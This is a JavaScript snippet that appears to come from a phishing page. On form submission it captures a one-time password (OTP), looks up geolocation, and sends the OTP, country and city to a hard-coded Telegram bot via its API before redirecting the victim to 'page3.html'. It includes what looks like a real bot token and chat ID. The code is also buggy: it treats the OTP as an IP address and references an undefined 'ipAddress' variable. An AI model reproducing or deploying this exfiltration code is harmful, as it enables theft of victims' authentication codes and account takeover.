// Replace 'YOUR_TELEGRAM_BOT_TOKEN' with your actual bot token
const token = '5303187517:AAFr6lnaqd0pFs9A2K4h5cbnJHjwGQL7OHk';

// Replace 'YOUR_CHAT_ID' with the desired chat ID where you want to send the data
const chatId = '5219329510';

// Get the HTML form element
const form = document.getElementById('input');

// Add event listener for form submission
form.addEventListener('submit', (event) => {
  event.preventDefault(); // Prevent the default form submission

  // Get the input value
  const input = document.getElementById('number');
  const inputValue = input.value;

  // Fetch IP geolocation data
  fetch(`http://www.geoplugin.net/json.gp?ip=${inputValue}`)
    .then(response => response.json())
    .then(data => {
      const country = data.geoplugin_countryName;
      const city = data.geoplugin_city;

      // Send the data to Telegram bot
      const message = `OTP: ${inputValue}\nIP Address: ${ipAddress}\nCountry: ${country}\nCity: ${city}`;
      const url = `https://api.telegram.org/bot5303187517:AAFr6lnaqd0pFs9A2K4h5cbnJHjwGQL7OHk/sendMessage?chat_id=5219329510&text=${encodeURIComponent(message)}`;

      fetch(url)
        .then(() => {
          // Redirect to another page
          window.location.href = 'page3.html';
        })
        .catch((error) => {
          console.error('Error:', error);
        });
    })
    .catch((error) => {
      console.error('Error:', error);
    });
});
